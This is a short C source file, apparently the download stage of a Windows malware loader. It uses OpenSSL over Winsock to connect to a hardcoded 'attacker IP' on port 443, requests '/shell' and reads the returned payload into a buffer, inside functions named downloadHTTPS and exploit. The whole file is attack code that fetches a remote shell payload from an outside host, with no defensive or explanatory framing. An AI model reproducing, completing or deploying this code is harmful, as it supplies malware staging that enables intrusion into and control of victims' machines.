#include <openssl/ssl.h>


#define BUFFER_SIZE 1024

char buffer[BUFFER_SIZE];
char ip[] = "10.10.10.10"; //attacker IP
int port = 443;


int downloadHTTPS()
{
    
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    addr.sin_addr.s_addr = inet_addr(ip);

    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    SSL_CTX* ctx = SSL_CTX_new(TLS_method());
    SSL* ssl = SSL_new(ctx);
    
    SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
    SSL_set_read_ahead(ssl, 1);

    SSL_set_fd(ssl, sockfd);
    SSL_connect(ssl);
    char* request = "GET /shell\r\n\r\n";
    SSL_write(ssl, request, strlen(request));
    
    int nb = SSL_read(ssl, buffer, BUFFER_SIZE);
    
    closesocket(sockfd);
    WSACleanup();

    return nb;
}

void exploit()
{
    int nb = downloadHTTPS();
    //printf("%d\n", nb);
}


int main()
{
    exploit();
    return 0;
}
